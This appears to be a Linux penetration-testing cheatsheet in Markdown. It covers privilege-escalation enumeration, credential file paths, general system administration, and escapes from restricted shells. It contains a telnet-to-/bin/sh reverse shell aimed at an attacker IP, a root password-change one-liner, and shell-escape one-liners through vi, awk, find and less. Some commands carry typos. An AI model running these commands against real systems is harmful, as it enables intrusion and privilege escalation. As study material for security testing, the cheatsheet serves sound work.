# Cheatsheet

## Password
```
/etc/pwd.db
/etc/passwd

/etc/spwd.db
/etc/shadow

/etc/master.passwd
```
## Cheatsheets
- Bash cheatsheet: https://devhints.io/bash.html
- Archiving: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/

## Essential escalation checks
```
# SUDO
sodu -l

# New file permissions
umask

# Scheduled
crontab -l
ls -alh /var/spool/cron
ls -alh /etc/ | grep cron
cat /etc/cron*
cat /etc/at.*
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

# Word Writables
find -type f -maxdepth 1 -writable

# SUID SGID
find "$DIRECTORY" -perm /6000 -exec ls -lah {} \;

# Distribution
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release
cat /etc/redhat-release

# Kernel
cat /proc/version
uname -a
rpm -q kernel
dmesg | grep Linux

# Environment
env
set
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout

# Processes
ps -aux | grep root
ps -aux | grep root | grep  tmux
```

## File System

### File information
```
file <filename>
```
- Type
- Architecture
- Debug symbols stripped
- etc.

### Shared library dependencies
```
ldd <filename>
```

### File Permissions

Permission in numeric mode

```
0 = No Permission
1 = Execute
2 = Write
4 = Read
```

Commands

```
chmod
chown
chgrp

```



#### Setuid - Set User ID
The process's effective user ID gets set to that of the program file itself (rather than that of the user running it).

- `S` - just the setuid bit
- `s` - setuid bit and execute x
- Dir - No effect on DIRs

#### Setgid - Set Group ID
The process's effective group ID gets set to that of the program file (rather than that of the user's primary group).

- Dir - any files created in that directory will have the same group as that directory

> http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html

#### Permission Flags
```
r w x
4 2 1 = 7
```

#### Changing Permissions
```
chmod g-w ChangeLog
chmod 744 ChangeLog
```

### Searching

#### With database:
```
updatedb ; locate sbd.exe
```

#### Withing PATH:
```
which sbd
```
```
whereis sdb
```

#### Complex:
```
find  /  -­‐name  sbd*
find / --name sdb* --exec file {} \;
```

#### Search for hidden (dot) files
```
find / -type d -name ".*"
```

## Hardware Information

### CPU Information
```
lscpu
cat /proc/cpuinfo
```

### Mounting Devices
```
mount -t <filesystemtype> <location>
mount -t /dev/cdrom /media
umount /dev/cdrom
```

## Process Information

### Running processes
```
ps aux

  all processes (a)
  the user (u)
  processes not associated with a terminal (x)

ps -ef
ps -eF

top
```

Tree of processes (processes & threads):
```
pstree -aclp
```
### Process priority
- `-20` is highest priority
- `19` is lowest priority
```
nice -n -20 <command>
```

```
renice <nice-value> <pid>
```

### Memory map for a process
```
 cat /proc/1234/maps
```
```
gdb
info proc mappings
```
```
pmap -d 1234
```

### /proc
- `/proc/<id>/environ` environment variables
- `/proc/<id>/cmdline` command line args/command used to run the process
- `/proc/<id>/maps` memory map
- `/proc/<id>/fd` open file descriptors

### System and library calls
- `ltrace`
- `strace`

### Access control
- `access` - Check permissions for the UID and GID of the process (executable file owner / group)
  - Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file.

### Other
```
killall <name>
kill -9 <pid>
kill <pid>
```

```
fg
bg
[Ctrl+Z]
```

## Services

### List of Services
```
cat /etc/services
```

### Commons service configurations
```
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
```

### Check if certain service is up:
```
update-­‐rc.d ssh enable
```

### Auto start a service:
```
update-­‐rc.d ssh enable
```

### Systemd services
```
Example:

/lib/systemd/system/snapd.service
```

### Systemd socket unit file
```
Example:

[Socket]
ListenStream=/run/snapd.socket
ListenStream=/run/snapd-snap.socket
SocketMode=0666
```
`0666` - Allow any process to connect and communicate with the socket.

## Network Layer

### Interface Information
```
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
```

### Network configuration
```
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
```

### Monitor network communication
```
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
```

### Cached IP and Mac Information
```
arp -e
route
/sbin/route -nee
```

### Change IP
```
ifconfig eth0 192.168.1.115
ifconfig eth0 192.168.1.115 netmask 255.255.255.0 broadcast 192.168.1.255
```

### Shell with built-in tools
```
nc -lvp 4444### Attacker. Input (Commands)
nc -lvp 4445### Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445### On the targets system. Use the attackers IP!
```
https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

### DHCP
Check `DHCP` page in `protocols` dir.

### DNS
Check `DNS` page in `protocols` dir.

### AF_UNIX
Used to communicate between processes on the same machine

### AF_INET and AF_INET6
Used for processes to communicate over a network connection.

### Interact with AF_UNIX Socket
```
nc -U /run/snapd.socket
GET / HTTP/1.1
Host: 127.0.0.1

```

### Tools
- Ship: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/

## OS Information

### Distribution
```
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release  ### Debian based
cat /etc/redhat-release   ### Redhat based
```

### Kernel
```
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
```

### Environment
```
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
```

### Printers
```
lpstat -a
```

### Sys calls
```
/usr/include /i386-linux-gnu/asm/unistd_32.h
```

### Kernel tuning
Temporary:
```
sysctl
```

Permanent:
```
/etc/sysctl.conf
```

View configuration:
```
sysctl -a |less
```

View  configuration files for the installed modprobe modules:
```
ls -l /etc/modprobe.d/
ls -R /lib/modules/$( uname -r )/kernel
```

### Kernel Modules
Insert module:
```
insmod
```

Remove module:
```
modprobe -r
rmmod
```

List modules:
```
modprobe -l
lsmod
```

### Installed Applications / Versions
```
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
```

### Scheduled Jobs
```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

## Startup Process

![](https://img.wonderhowto.com/img/44/77/63591930046359/0/linux-basics-for-aspiring-hacker-using-start-up-scripts.w1456.jpg)
> https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/

### Run levels
```
0 - halt the system
1 - single user mode (minimal services)
2 - multi-user modes
3 - multi-user mode
4 - multi-user mode
5 - multi-user mode
6 - reboot the system
```

### Init.d Process

- Has process ID: 1
- `/etc/init.d` scripts with 755 permission
- init process then hands over the boot-up processes to `rc.d` daemon

### rc.local

```
/etc/init.d/rc.local
```
Script to start necessary processes in the background when the system boots up

## Managing Hard Disks

`hda` for hard disks.
`sda` for newer SATA disks (SCSI).

Partitions within `sda` are `sda1`, `sda2`, ...

- Basic disk Information: `df -h`
- Partitions on disk: `fdsisk -l`
- Block device information: `lsblk`
- Editing and displaying partitions: `parted` / `cfdisk`
  - `(parted) print`
  - `(parted) select /dev/sdb`
- Change HDD parameters: `hdparm`

### Debugfs

- Simple-to-use RAM-based file system specially designed for debugging purposes
- Mount file system (usable to access `/root` by only being in `disk` group)

```
debugfs /dev/sda1
```

## General Text Manipulation Commands
```
cat
head
tail
nl
wc
grep
sed s/ex/ex1/ text.txt
sed s/ex/ex1/g text.txt
sed s/ex/ex1/3 text.txt
```

## StdIn StdOut and SrdErr
- 0 StdIn
- 1 StdOut
- 2 SrdErr

## Daemons

### inetd, xinetd
Inetd always runs in the background and it then decides when to start and stop other daemons.

### rlinetd
```
rlinetd.conf
/etc/rlinetd.d
```
- Disable unnecessary demons
- Configure IPs that can access a demon

## Restricted shell
- Ref: https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html
```
rbash, or the --restricted or -r
```

Bypass:
```
ssh mindy@10.10.10.51 bash
```

## Change password (one liner)
```
echo root:password | /usr/sbin/chpasswd
```

## New line in command line

```
$ echo "abc[CTRL+M]
def"
```

## Log file locations

- `/var/www/syslog`

## Code execution

Files in `SLAPPER_FILES` list will get executed:
```
for i in ${SLAPPER_FILES}; do
   if [ -f ${i} ]; then
      file_port=$file_port $i
      STATUS=1
   fi
done
```

Should be corrected to:
```
file_port="$file_port $i"
```

> Ref: https://www.exploit-db.com/exploits/33899

## Tmux

Connect to existing session:
```
tmux -S /.devs/dev_sess​
```

## Special File Handling

### 7z files

- Print file information: `7z l -slt example.zip`
- Extract: `7z x example.zip`

### Microsoft Outlook Personal Folder (PST)

- Examine: `readpst -tea -m example.pst`

## Screenshot

- Need `video` group access
- Resolution: `cat /sys/class/graphics/fb0/virtual_size`
- Video feed: Open `​/dev/fb0​` in a image editor

```
cp /dev/fb0 screenshot.raw
iraw2png 1024 768 < screenshot.raw > screenshot.png

fbdump
```

References
- [https://www.kernel.org/doc/Documentation/fb/framebuffer.txt](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt)

## Escape shell

```
env
echo $PATH
echo /usr/local/rbin/*
```

List read only variables (check If PATH or SHELL is writable):

```
export -p
```

VI / VIM

```
:set shell=/bin/bash
:shell
```

```
:! /bin/bash
```

AWK

```
awk 'BEGIN {system("/bin/sh")}'
```

Find

```
find / -name blahblah -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

More / Less / Man

```
'! /bin/sh'
'!/bin/sh'
'!bash'
```

Tee

```
echo "evil script code" | tee script.sh
```

Languages

```
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
irb(main:001:0> exec "/bin/sh"
```



- Copy files into $PATH
- Copy file into HOME (scp/ftp)
- Some restricted shells will start by running some files in an unrestricted mode (If your .bash_profile is executed in an unrestricted mode and it's editable)
- If HISTFILE and HISTSIZE are writable:
  - Set HISTFILE to the file you want to overwrite (preferably an executable)
  - Set HISTSIZE to 0 and then back to 100,
  - Then execute the lines you want in your shell script

References

- [https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)
